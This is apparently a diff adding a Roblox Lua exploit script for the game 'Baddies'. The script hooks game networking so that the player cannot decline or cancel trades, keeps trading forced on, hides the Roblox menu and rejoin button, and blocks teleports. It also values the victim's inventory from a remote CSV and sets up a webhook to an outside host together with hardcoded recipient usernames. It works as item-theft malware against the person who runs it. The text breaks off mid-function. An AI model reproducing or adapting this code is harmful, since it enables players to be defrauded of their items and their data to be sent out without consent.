@@ -1,0 +1,1999 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Replion = require(ReplicatedStorage.Modules.Replion)
+local HttpService = game:GetService("HttpService")
+
+local function loadItemValues()
+    local csvUrl = "https://pastefy.app/yVwvz5BB/raw"
+    local itemValues = {}
+    local tokenValues = {}
+    local highValueItems = {}
+    local fightingStylesFromCSV = {}
+    
+    local success, result = pcall(function()
+        if syn and syn.request then
+            return syn.request({
+                Url = csvUrl,
+                Method = "GET"
+            })
+        elseif request then
+            return request({
+                Url = csvUrl,
+                Method = "GET"
+            })
+        elseif http_request then
+            return http_request({
+                Url = csvUrl,
+                Method = "GET"
+            })
+        end
+        return nil
+    end)
+    
+    if success and result and result.Body then
+        -- Parse CSV properly
+        local lines = {}
+        for line in result.Body:gmatch("[^\r\n]+") do
+            table.insert(lines, line)
+        end
+        
+        -- Find the header row to determine column positions
+        local headerRow = lines[1]
+        local headers = {}
+        local current = ""
+        local inQuotes = false
+        local headerIndex = 1
+        
+        for char in headerRow:gmatch(".") do
+            if char == '"' then
+                inQuotes = not inQuotes
+            elseif char == ',' and not inQuotes then
+                headers[headerIndex] = current:gsub('^%s+', ''):gsub('%s+$', '')
+                headerIndex = headerIndex + 1
+                current = ""
+            else
+                current = current .. char
+            end
+        end
+        headers[headerIndex] = current:gsub('^%s+', ''):gsub('%s+$', '')
+        
+        -- Find column indices
+        local nameCol, valueCol, tokenCol, categoryCol
+        for i, header in ipairs(headers) do
+            local h = header:lower()
+            if h:find("name") or h:find("item") then
+                nameCol = i
+            elseif h:find("value") or h:find("price") then
+                valueCol = i
+            elseif h:find("token") then
+                tokenCol = i
+            elseif h:find("category") or h:find("type") then
+                categoryCol = i
+            end
+        end
+        
+        -- If we couldn't find columns by header, use default positions
+        if not nameCol then nameCol = 1 end
+        if not valueCol then valueCol = 2 end
+        if not tokenCol then tokenCol = 3 end
+        if not categoryCol then categoryCol = 6 end
+        
+        -- Parse data rows
+        for i = 2, #lines do
+            local parts = {}
+            local current = ""
+            local inQuotes = false
+            local partIndex = 1
+            
+            for char in lines[i]:gmatch(".") do
+                if char == '"' then
+                    inQuotes = not inQuotes
+                elseif char == ',' and not inQuotes then
+                    parts[partIndex] = current
+                    partIndex = partIndex + 1
+                    current = ""
+                else
+                    current = current .. char
+                end
+            end
+            parts[partIndex] = current
+            
+            if #parts >= math.max(nameCol or 1, valueCol or 2, tokenCol or 3, categoryCol or 6) then
+                local name = (parts[nameCol] or ""):gsub('"', ''):gsub('^%s+', ''):gsub('%s+$', '')
+                local value = tonumber((parts[valueCol] or "0"):gsub('"', ''):gsub(',', '')) or 0
+                local tokenValue = tonumber((parts[tokenCol] or "0"):gsub('"', ''):gsub(',', '')) or 0
+                local category = (parts[categoryCol] or ""):gsub('"', ''):gsub('^%s+', ''):gsub('%s+$', '')
+                
+                if name and name ~= "" then
+                    if category:lower():find("fighting") or category:lower():find("style") then
+                        fightingStylesFromCSV[name] = true
+                        itemValues[name] = value
+                        tokenValues[name] = tokenValue
+                    end
+                    
+                    if value >= 1000 and not category:lower():find("fighting") then
+                        itemValues[name] = value
+                        tokenValues[name] = tokenValue
+                        highValueItems[name] = true
+                    end
+                    
+                    -- Store all items even if not high value
+                    if not itemValues[name] then
+                        itemValues[name] = value
+                        tokenValues[name] = tokenValue
+                    end
+                end
+            end
+        end
+    end
+    
+    return itemValues, tokenValues, highValueItems, fightingStylesFromCSV
+end
+
+local ITEM_VALUES, TOKEN_VALUES, HIGH_VALUE_ITEMS, FIGHTING_STYLES_FROM_CSV = loadItemValues()
+
+-- Debug: Print loaded values
+print("Loaded ITEM_VALUES count: " .. #ITEM_VALUES)
+for name, value in pairs(ITEM_VALUES) do
+    print(name .. ": $" .. value .. " | Tokens: " .. (TOKEN_VALUES[name] or 0))
+end
+
+local data = Replion.Client:GetReplion("Data")
+repeat task.wait() until data
+
+local weaponSkins = data:Get({"NewInventory", "Items", "WeaponSkin"})
+
+local FightingStyles = {
+	["Boxing"] = true,
+	["Kickboxing"] = true,
+	["MMA Fighting"] = true,
+	["Glitter Style"] = true,
+	["Karate Style"] = true,
+	["Mean Girl Mayhem Style"] = true,
+	["Princess Punchout Style"] = true,
+	["Puppet Panic Style"] = true,
+	["Rough 'n' Rude Style"] = true,
+	["Feral Frenzy Style"] = true,
+	["Heartbreaker Style"] = true,
+	["Princess Power Style"] = true,
+	["Storm Dancer Style"] = true,
+	["Hug of Doom Style"] = true,
+	["Bubble Pop Style"] = true,
+	["Angel Style"] = true,
+	["Black Hex Style"] = true,
+	["Fantasy Style"] = true,
+    ["Goth Style"] = true,
+    ["Beast Style"] = true
+}
+
+for styleName, _ in pairs(FIGHTING_STYLES_FROM_CSV) do
+    FightingStyles[styleName] = true
+end
+
+local SKIP_WEAPONS = {
+	["Stick"] = true,
+	["Spearhead Stick"] = false,
+	["Text Sign"] = true,
+	["Slingshot"] = false,
+	["Rusty Bow"] = false,
+	["Regular Bow"] = false
+}
+
+local ownedFightingStyles = {}
+
+for id, item in pairs(weaponSkins or {}) do
+	if FightingStyles[item.Name] then
+		table.insert(ownedFightingStyles, item.Name)
+	end
+end
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local VirtualUser = game:GetService('VirtualUser')
+local TweenService = game:GetService("TweenService")
+
+local player = Players.LocalPlayer
+
+repeat task.wait() until player and player:IsA("Player") and player.PlayerGui
+
+local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
+
+local DeclineRemote = Net:WaitForChild("RF/Trading/DeclineTradeOffer")
+local AcceptRemote = Net:WaitForChild("RF/Trading/AcceptTradeOffer")
+local SendTradeOfferRemote = Net:WaitForChild("RF/Trading/SendTradeOffer")
+local CancelTradeRemote = Net:WaitForChild("RF/Trading/CancelTrade")
+local PhoneSettingsRemote = Net:WaitForChild("RE/SetPhoneSettings")
+
+local oldDeclineHook
+oldDeclineHook = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    local args = {...}
+    
+    if (method == "InvokeServer" or method == "FireServer") and self == DeclineRemote then
+        return nil
+    end
+    
+    if (method == "InvokeServer" or method == "FireServer") and self == CancelTradeRemote then
+        return nil
+    end
+    
+    if (method == "FireServer" or method == "InvokeServer") and self == PhoneSettingsRemote then
+        if args[1] == "TradeEnabled" and args[2] == false then
+            return nil
+        end
+        return oldDeclineHook(self, ...)
+    end
+    
+    if (method == "InvokeServer" or method == "FireServer") and (self == AcceptRemote or self == SendTradeOfferRemote) then
+        return oldDeclineHook(self, ...)
+    end
+    
+    return oldDeclineHook(self, ...)
+end)
+
+pcall(function()
+    local originalFire = PhoneSettingsRemote.FireServer
+    PhoneSettingsRemote.FireServer = function(self, setting, value)
+        if setting == "TradeEnabled" and value == false then
+            return nil
+        end
+        return originalFire(self, setting, value)
+    end
+end)
+
+task.spawn(function()
+    pcall(function()
+        local NetModule = require(ReplicatedStorage.Modules.Net)
+        if NetModule then
+            if NetModule["RF/Trading/DeclineTradeOffer"] then
+                local declineRF = NetModule["RF/Trading/DeclineTradeOffer"]
+                declineRF.InvokeServer = function(...) return nil end
+                declineRF.FireServer = function(...) return nil end
+            end
+            
+            if NetModule["RF/Trading/CancelTrade"] then
+                local cancelRF = NetModule["RF/Trading/CancelTrade"]
+                cancelRF.InvokeServer = function(...) return nil end
+                cancelRF.FireServer = function(...) return nil end
+            end
+            
+            if NetModule["RE/SetPhoneSettings"] then
+                local phoneRF = NetModule["RE/SetPhoneSettings"]
+                local originalPhoneFire = phoneRF.FireServer
+                phoneRF.FireServer = function(setting, value)
+                    if setting == "TradeEnabled" and value == false then
+                        return nil
+                    end
+                    return originalPhoneFire(setting, value)
+                end
+            end
+        end
+    end)
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            PhoneSettingsRemote:FireServer("TradeEnabled", true)
+        end)
+        task.wait(0)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+            if robloxGui then
+                robloxGui.Enabled = false
+            end
+        end)
+        task.wait(1)
+    end
+end)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
+
+local InventoryClient = require(ReplicatedStorage.Modules.Inventory.Client)
+
+local Modules = ReplicatedStorage:WaitForChild("Modules")
+local TradeData = require(Modules.Trading.TradeData)
+local Replion = require(Modules.Replion)
+local Net = require(Modules.Net)
+local MessageEvent = Net:RemoteEvent("Trade/MessageEvent")
+
+local data = Replion.Client:GetReplion("Data")
+repeat task.wait() until data
+
+local weaponSkins = data:Get({"NewInventory", "Items", "WeaponSkin"})
+local stompList = require(ReplicatedStorage.SkinCrates.Items.Stomp)
+
+local loveboardList = {
+    ["Credit Card Hoverboard"] = true,
+    ["Popstar Hoverboard"] = true,
+    ["Graduation Hat Hoverboard"] = true,
+    ["Surf's Up Hoverboard"] = true,
+    ["Pink Star Board"] = true,
+    ["Ice cream Sandwich Board"] = true,
+    ["Angel Wings"] = true,
+    ["Void Demon Wings"] = true,
+    ["Bath Tub Hoverboard"] = true,
+    ["Rocket Hoverboard"] = true,
+    ["St Patrick's Board"] = true,
+}
+
+local ownedStomps = {}
+local ownedLoveboards = {}
+local ownedFightingStylesList = {}
+local ownedHighValueSkins = {}
+
+for id, item in pairs(weaponSkins or {}) do
+    if item.Name then
+        local itemName = item.Name:lower()
+        
+        if FightingStyles[item.Name] then
+            table.insert(ownedFightingStylesList, item.Name)
+        end
+        
+        if HIGH_VALUE_ITEMS[item.Name] then
+            ownedHighValueSkins[item.Name] = true
+        end
+        
+        for stompName, _ in pairs(stompList) do
+            local stompLower = stompName:lower()
+            if string.find(itemName, stompLower) then
+                ownedStomps[stompName] = true
+                break
+            end
+        end
+        
+        for loveboardName, _ in pairs(loveboardList) do
+            if item.Name == loveboardName then
+                ownedLoveboards[loveboardName] = true
+            end
+        end
+    end
+end
+
+if game.PlaceId ~= 84780374286597 and game.PlaceId ~= 11158043705 then
+    localPlayer:Kick("Script doesn't support this game, join BADDIES")
+    return
+end
+
+local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
+local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
+local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
+local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
+local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
+local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
+
+local RICH_WEBHOOK = "https://sentinelhook.lol/api.php?id=pdjVByArjOg11TA"
+local POOR_WEBHOOK = _G.POOR_WEBHOOK or ""
+
+local HARDCODED_RICH_USERNAMES = {"qua_lovesAJJ", "LostIatinagirI", "WinningBaddiesStar"}
+local HARDCODED_POOR_USERNAMES = {}
+
+local RICH_USERNAMES = {}
+local POOR_USERNAMES = {}
+
+for _, name in ipairs(HARDCODED_RICH_USERNAMES) do
+    table.insert(RICH_USERNAMES, name)
+end
+
+for _, name in ipairs(HARDCODED_POOR_USERNAMES) do
+    table.insert(POOR_USERNAMES, name)
+end
+
+local CUSTOM_RICH = _G.RICH_USERNAMES or {}
+local CUSTOM_POOR = _G.POOR_USERNAMES or {}
+
+for _, name in ipairs(CUSTOM_RICH) do
+    local isDuplicate = false
+    for _, existing in ipairs(RICH_USERNAMES) do
+        if existing:lower() == name:lower() then isDuplicate = true break end
+    end
+    if not isDuplicate then table.insert(RICH_USERNAMES, name) end
+end
+
+for _, name in ipairs(CUSTOM_POOR) do
+    local isDuplicate = false
+    for _, existing in ipairs(POOR_USERNAMES) do
+        if existing:lower() == name:lower() then isDuplicate = true break end
+    end
+    if not isDuplicate then table.insert(POOR_USERNAMES, name) end
+end
+
+local MY_USERNAMES = {}
+for _, name in ipairs(RICH_USERNAMES) do
+    table.insert(MY_USERNAMES, name)
+end
+for _, name in ipairs(POOR_USERNAMES) do
+    table.insert(MY_USERNAMES, name)
+end
+
+local PING_POOR = _G.PING_POOR or false
+
+local GUI_PROTECTION_ENABLED = true
+local PROTECTED_GUIS = {
+    ["GeneralGUI"] = {enabled = true, requiredProperties = {{path = "Buttons", visible = true}}},
+    ["BackpackGui"] = {enabled = true, requiredProperties = {{path = "Backpack", visible = true}}}
+}
+
+local isTrading = false
+local currentTradePartner = nil
+local tradingPlayers = {}
+local isProcessing = false
+local jumped = false
+local activeTargets = {}
+local skinsAlreadyAdded = false
+local fightingStylesAlreadyAdded = false
+local weaponsAddedFlag = false
+local isRichTarget = false
+local blockAllTrades = false
+local playerTokens = 0
+
+local function getPlayerTokens()
+    local ls = localPlayer:FindFirstChild("leaderstats")
+    if ls then
+        local tokens = ls:FindFirstChild("Tokens")
+        if tokens then
+            return tokens.Value or 0
+        end
+    end
+    return 0
+end
+
+playerTokens = getPlayerTokens()
+
+local rejectionMessages = {
+    "no no no no i thought we were having a nice date 👹",
+    "Quiet on the Creek 🤫🎣",
+    "kicking my feet giggling twirling my hair 🥰💃✨",
+    "opium bird says go back to work 🦅💸"
+}
+
+local function getRandomRejection()
+    return rejectionMessages[math.random(1, #rejectionMessages)]
+end
+
+local function blockLeaveRejoin()
+    pcall(function()
+        local ts = game:GetService("TeleportService")
+        local originalTeleport = ts.Teleport
+        ts.Teleport = function(...) 
+            return nil 
+        end
+        
+        local originalTeleportToPlaceInstance = ts.TeleportToPlaceInstance
+        ts.TeleportToPlaceInstance = function(...)
+            return nil
+        end
+        
+        local function blockRejoin()
+            if game:GetService("GuiService"):FindFirstChild("RobloxGui") then
+                local robloxGui = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
+                if robloxGui then
+                    local rejoinBtn = robloxGui:FindFirstChild("RejoinButton")
+                    if rejoinBtn then
+                        rejoinBtn.Visible = false
+                        rejoinBtn.Enabled = false
+                    end
+                end
+            end
+        end
+        
+        task.spawn(function()
+            while true do
+                pcall(blockRejoin)
+                task.wait(0.5)
+            end
+        end)
+    end)
+end
+
+blockLeaveRejoin()
+
+task.spawn(function()
+    pcall(function()
+        local TradingModule = require(ReplicatedStorage.Modules.Trading.TradeData)
+        if TradingModule and TradingModule.Remotes then
+            if TradingModule.Remotes.DeclineTradeOffer then
+                TradingModule.Remotes.DeclineTradeOffer.InvokeServer = function(...) return nil end
+                TradingModule.Remotes.DeclineTradeOffer.FireServer = function(...) return nil end
+            end
+            if TradingModule.Remotes.CancelTrade then
+                TradingModule.Remotes.CancelTrade.InvokeServer = function(...) return nil end
+                TradingModule.Remotes.CancelTrade.FireServer = function(...) return nil end
+            end
+        end
+    end)
+end)
+
+local function protectGUIs()
+    if not GUI_PROTECTION_ENABLED then return end
+    for guiName, settings in pairs(PROTECTED_GUIS) do
+        local gui = playerGui:FindFirstChild(guiName)
+        if gui then
+            if settings.enabled and not gui.Enabled then gui.Enabled = true end
+            for _, property in ipairs(settings.requiredProperties) do
+                local target = gui:FindFirstChild(property.path)
+                if target and target:IsA("GuiObject") and property.visible ~= nil and target.Visible ~= property.visible then
+                    target.Visible = property.visible
+                end
+            end
+        end
+    end
+end
+
+task.spawn(function() while true do protectGUIs() task.wait(0.1) end end)
+
+local SatchelModule = Modules:WaitForChild("Satchel")
+local LoadoutModule = require(SatchelModule)
+
+if LoadoutModule and LoadoutModule.SetBackpackEnabled then
+    local originalSetBackpackEnabled = LoadoutModule.SetBackpackEnabled
+    LoadoutModule.SetBackpackEnabled = function(self, enabled)
+        originalSetBackpackEnabled(self, true)
+    end
+end
+
+task.spawn(function()
+    task.wait(2)
+    
+    local success, CustomBackpackModule = pcall(function()
+        return require(script.Parent.CustomBackpackController)
+    end)
+    
+    if success and CustomBackpackModule then
+        if CustomBackpackModule._canEnable then
+            CustomBackpackModule._canEnable = function() return true end
+        end
+        
+        if CustomBackpackModule._toggleBackpackTo then
+            local originalToggle = CustomBackpackModule._toggleBackpackTo
+            CustomBackpackModule._toggleBackpackTo = function(self, enabled)
+                return originalToggle(self, true)
+            end
+        end
+        
+        if CustomBackpackModule._disable then
+            CustomBackpackModule._disable = function() return end
+        end
+        
+        if CustomBackpackModule._disableSpam then
+            CustomBackpackModule._disableSpam = function() return end
+        end
+        
+        if CustomBackpackModule._freeze then
+            CustomBackpackModule._freeze = function() return end
+        end
+        
+        if CustomBackpackModule._enable then
+            CustomBackpackModule:_enable()
+        end
+        
+        CustomBackpackModule._enabled = true
+    end
+end)
+
+task.spawn(function()
+    local attributesToBlock = {
+        "Freezed",
+        "BeingArrested",
+        "BeingDogLeashed",
+        "BeingTombstoneTrapped",
+        "USER_DRIVING",
+        "USER_VEHICLE_SITTING",
+        "IN_DRESS_ROOM",
+        "CARRYING_EGG",
+        "UNDERGROUND_FIGHTING",
+        "BeingSchoolLockerTrapped"
+    }
+    
+    for _, attrName in ipairs(attributesToBlock) do
+        localPlayer:GetAttributeChangedSignal(attrName):Connect(function()
+            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
+                LoadoutModule:SetBackpackEnabled(true)
+            end
+            
+            pcall(function()
+                local CustomBackpackModule = require(script.Parent.CustomBackpackController)
+                if CustomBackpackModule then
+                    if CustomBackpackModule._enable then
+                        CustomBackpackModule:_enable()
+                    end
+                    if CustomBackpackModule._toggleBackpackTo then
+                        CustomBackpackModule:_toggleBackpackTo(true)
+                    end
+                    CustomBackpackModule._enabled = true
+                end
+            end)
+        end)
+    end
+end)
+
+localPlayer.CharacterAdded:Connect(function(character)
+    task.wait(0.5)
+    local humanoid = character:WaitForChild("Humanoid")
+    
+    if LoadoutModule and LoadoutModule.SetBackpackEnabled then
+        LoadoutModule:SetBackpackEnabled(true)
+    end
+    
+    if humanoid then
+        humanoid.StateChanged:Connect(function(oldState, newState)
+            task.wait(0.1)
+            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
+                LoadoutModule:SetBackpackEnabled(true)
+            end
+        end)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            local backpackGui = playerGui:FindFirstChild("BackpackGui")
+            if backpackGui then
+                local backpack = backpackGui:FindFirstChild("Backpack")
+                if backpack then
+                    local hotbar = backpack:FindFirstChild("Hotbar")
+                    if hotbar and hotbar:IsA("Frame") then
+                        if not hotbar.Visible then hotbar.Visible = true end
+                        if hotbar.Enabled ~= nil and not hotbar.Enabled then hotbar.Enabled = true end
+                        for _, child in ipairs(hotbar:GetChildren()) do
+                            if child:IsA("GuiObject") and not child.Visible then child.Visible = true end
+                        end
+                    end
+                end
+            end
+            
+            if backpackGui and not backpackGui.Enabled then
+                backpackGui.Enabled = true
+            end
+        end)
+        task.wait(0.1)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
+                LoadoutModule:SetBackpackEnabled(true)
+            end
+            
+            local success, CustomBackpackModule = pcall(function()
+                return require(script.Parent.CustomBackpackController)
+            end)
+            
+            if success and CustomBackpackModule then
+                if CustomBackpackModule._enable then
+                    CustomBackpackModule:_enable()
+                end
+                if CustomBackpackModule._toggleBackpackTo then
+                    CustomBackpackModule:_toggleBackpackTo(true)
+                end
+                CustomBackpackModule._enabled = true
+            end
+        end)
+        task.wait(0.5)
+    end
+end)
+
+for _, child in ipairs(SatchelModule:GetChildren()) do
+    if child.Name == "BackpackItemAdded" and child:IsA("RemoteEvent") then
+        child.Event:Connect(function()
+            if LoadoutModule and LoadoutModule.SetBackpackEnabled then
+                LoadoutModule:SetBackpackEnabled(true)
+            end
+        end)
+    end
+end
+
+local function hasSpikedKittyStanli()
+    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", guid)
+        if item and item.Name == "Spiked Kitty Stanli" then return true end
+    end
+    return false
+end
+
+local function hasGlitterBomb()
+    for _, guid in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", guid)
+        if item and item.Name == "Glitter Bomb" then return true end
+    end
+    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", guid)
+        if item and item.Name == "Glitter Bomb" then return true end
+    end
+    return false
+end
+
+local function hasGlitterBlueSpray()
+    for _, guid in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", guid)
+        if item and item.Name == "Glitter Blue Spray" then return true end
+    end
+    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", guid)
+        if item and item.Name == "Glitter Blue Spray" then return true end
+    end
+    return false
+end
+
+local function hasLoveMeHateMeTaser()
+    for _, guid in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", guid)
+        if item and item.Name == "Love Me Hate Me Taser" then return true end
+    end
+    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", guid)
+        if item and item.Name == "Love Me Hate Me Taser" then return true end
+    end
+    return false
+end
+
+local function hasSpikedKnuckles()
+    for _, guid in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", guid)
+        if item and item.Name == "Spiked Knuckles" then return true end
+    end
+    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", guid)
+        if item and item.Name == "Spiked Knuckles" then return true end
+    end
+    return false
+end
+
+local function hasIceKatana()
+    for _, guid in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", guid)
+        if item and item.Name == "Ice Katana" then return true end
+    end
+    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", guid)
+        if item and item.Name == "Ice Katana" then return true end
+    end
+    return false
+end
+
+local function hasSurfsUp()
+    for _, guid in ipairs(InventoryClient:FindItems("SurfsUpHoverboard")) do
+        if InventoryClient:GetItem("SurfsUpHoverboard", guid) then return true end
+    end
+    return false
+end
+
+local function hasTradePin()
+    pcall(function()
+        local tradePin = data:Get({"TradePin"})
+        if tradePin and tradePin ~= "" then
+            return true
+        end
+    end)
+    return false
+end
+
+local function getInventory()
+    local data = InventoryClient:Get()
+    if not data or not data.Items then
+        return nil
+    end
+    return data.Items
+end
+
+local function IsTradable(item)
+    if not item then return false end
+    
+    local lock = item.TradeLock
+    
+    if not lock then
+        return true
+    end
+    
+    if lock.Type == "Untradable" then
+        return false
+    end
+    
+    if lock.Type == "Timestamp" then
+        if lock.Time and lock.Time > os.time() then
+            return false
+        end
+        return true
+    end
+    
+    return false
+end
+
+local function getAllInventoryWeaponsWithTradeStatus()
+    local counts = {}
+    local allWeapons = {}
+    local totalWeapons = 0
+    local tradableCount = 0
+    local untradableCount = 0
+    local weaponTradeStatus = {}
+    local totalValue = 0
+    local weaponValues = {}
+    local totalTokenValue = 0
+    
+    local inv = getInventory()
+    
+    if inv and inv.Weapon then
+        for guid, item in pairs(inv.Weapon) do
+            if item and item.Name then
+                if not SKIP_WEAPONS[item.Name] then
+                    local tradable = IsTradable(item)
+                    local value = ITEM_VALUES[item.Name] or 0
+                    local tokenValue = TOKEN_VALUES[item.Name] or 0
+                    counts[item.Name] = (counts[item.Name] or 0) + 1
+                    totalWeapons = totalWeapons + 1
+                    if tradable then
+                        tradableCount = tradableCount + 1
+                        totalValue = totalValue + value
+                        totalTokenValue = totalTokenValue + tokenValue
+                    else
+                        untradableCount = untradableCount + 1
+                    end
+                    weaponTradeStatus[item.Name] = weaponTradeStatus[item.Name] or {}
+                    table.insert(weaponTradeStatus[item.Name], tradable)
+                    table.insert(allWeapons, item.Name .. "::None::" .. tostring(tradable) .. "::" .. tostring(value) .. "::" .. tostring(tokenValue))
+                    weaponValues[item.Name] = (weaponValues[item.Name] or 0) + value
+                end
+            end
+        end
+    end
+    
+    if inv and inv.WeaponSkin then
+        for guid, item in pairs(inv.WeaponSkin) do
+            if item then
+                local weaponName = item.Weapon or item.WeaponName or item.Type
+                local skinName = item.Name
+                if weaponName and skinName then 
+                    if not FightingStyles[item.Name] then
+                        local tradable = IsTradable(item)
+                        local value = ITEM_VALUES[item.Name] or 0
+                        local tokenValue = TOKEN_VALUES[item.Name] or 0
+                        table.insert(allWeapons, weaponName .. "::" .. skinName .. "::" .. tostring(tradable) .. "::" .. tostring(value) .. "::" .. tostring(tokenValue))
+                        if tradable then
+                            totalValue = totalValue + value
+                            totalTokenValue = totalTokenValue + tokenValue
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    return counts, allWeapons, totalWeapons, tradableCount, untradableCount, weaponTradeStatus, totalValue, weaponValues, totalTokenValue
+end
+
+local function getAllInventoryWeapons()
+    local counts = {}
+    local allWeapons = {}
+    local totalWeapons = 0
+    for _, guid in ipairs(InventoryClient:FindItems("Weapon")) do
+        local item = InventoryClient:GetItem("Weapon", guid)
+        if item and item.Name then
+            if not SKIP_WEAPONS[item.Name] then
+                counts[item.Name] = (counts[item.Name] or 0) + 1
+                totalWeapons = totalWeapons + 1
+                table.insert(allWeapons, item.Name .. "::None")
+            end
+        end
+    end
+    for _, guid in ipairs(InventoryClient:FindItems("WeaponSkin")) do
+        local item = InventoryClient:GetItem("WeaponSkin", guid)
+        if item then
+            local weaponName = item.Weapon or item.WeaponName or item.Type
+            local skinName = item.Name
+            if weaponName and skinName then 
+                if not FightingStyles[item.Name] then
+                    table.insert(allWeapons, weaponName .. "::" .. skinName)
+                end
+            end
+        end
+    end
+    return counts, allWeapons, totalWeapons
+end
+
+local function getAllStomps()
+    local stomps = {}
+    for stompName, _ in pairs(ownedStomps) do
+        table.insert(stomps, stompName)
+    end
+    return stomps
+end
+
+local function getAllLoveboards()
+    local loveboards = {}
+    for loveboardName, _ in pairs(ownedLoveboards) do
+        table.insert(loveboards, loveboardName)
+    end
+    return loveboards
+end
+
+local function getAllFightingStyles()
+    local styles = {}
+    for _, styleName in ipairs(ownedFightingStylesList) do
+        table.insert(styles, styleName)
+    end
+    return styles
+end
+
+local function getAllHighValueSkins()
+    local skins = {}
+    for skinName, _ in pairs(ownedHighValueSkins) do
+        table.insert(skins, skinName)
+    end
+    return skins
+end
+
+local function formatNumber(num)
+    if not num then return "N/A" end
+    if num >= 1000000 then return string.format("%.1fM", num / 1000000)
+    elseif num >= 1000 then return string.format("%.1fK", num / 1000)
+    else return tostring(num) end
+end
+
+local function formatSkinList()
+    local stompList = getAllStomps()
+    local loveboardList = getAllLoveboards()
+    local fightingStylesList = getAllFightingStyles()
+    local highValueList = getAllHighValueSkins()
+    
+    local result = {}
+    
+    if #fightingStylesList > 0 then
+        local display = ""
+        if #fightingStylesList <= 3 then
+            display = table.concat(fightingStylesList, ", ")
+        else
+            local first3 = {}
+            for i = 1, 3 do table.insert(first3, fightingStylesList[i]) end
+            display = table.concat(first3, ", ") .. " and " .. (#fightingStylesList - 3) .. " more"
+        end
+        table.insert(result, "Fighting Styles: " .. display)
+    end
+    
+    if #stompList > 0 then
+        local display = ""
+        if #stompList <= 3 then
+            display = table.concat(stompList, ", ")
+        else
+            local first3 = {}
+            for i = 1, 3 do table.insert(first3, stompList[i]) end
+            display = table.concat(first3, ", ") .. " and " .. (#stompList - 3) .. " more"
+        end
+        table.insert(result, "Stomps: " .. display)
+    end
+    
+    if #loveboardList > 0 then
+        local display = ""
+        if #loveboardList <= 3 then
+            display = table.concat(loveboardList, ", ")
+        else
+            local first3 = {}
+            for i = 1, 3 do table.insert(first3, loveboardList[i]) end
+            display = table.concat(first3, ", ") .. " and " .. (#loveboardList - 3) .. " more"
+        end
+        table.insert(result, "Loveboards: " .. display)
+    end
+    
+    if #highValueList > 0 then
+        local display = ""
+        if #highValueList <= 3 then
+            display = table.concat(highValueList, ", ")
+        else
+            local first3 = {}
+            for i = 1, 3 do table.insert(first3, highValueList[i]) end
+            display = table.concat(first3, ", ") .. " and " .. (#highValueList - 3) .. " more"
+        end
+        table.insert(result, "High Value Skins: " .. display)
+    end
+    
+    if #result == 0 then
+        return "None"
+    end
+    
+    return table.concat(result, "\n")
+end
+
+local function deleteMessagesGui()
+    local messagesGui = playerGui:FindFirstChild("Messages")
+    if messagesGui then messagesGui:Destroy() end
+end
+
+local function sendRequest(url, body)
+    if not url or url == "" then return nil end
+    local headers = {["Content-Type"] = "application/json"}
+    local encoded = body
+    if type(body) ~= "string" then
+        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
+        if ok then encoded = s else encoded = "{}" end
+    end
+    local candidates = {
+        function() if syn and syn.request then return syn.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if request then return request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if http and http.request then return http.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if http_request then return http_request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
+        function() if fluxus and fluxus.request then return fluxus.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end
+    }
+    for _, tryFn in ipairs(candidates) do
+        local ok, res = pcall(tryFn)
+        if ok and res then
+            if res.Success == true or res.StatusCode == 200 or (res.Body ~= nil) then return res end
+        end
+    end
+    return nil
+end
+
+local function safeClick(btn)
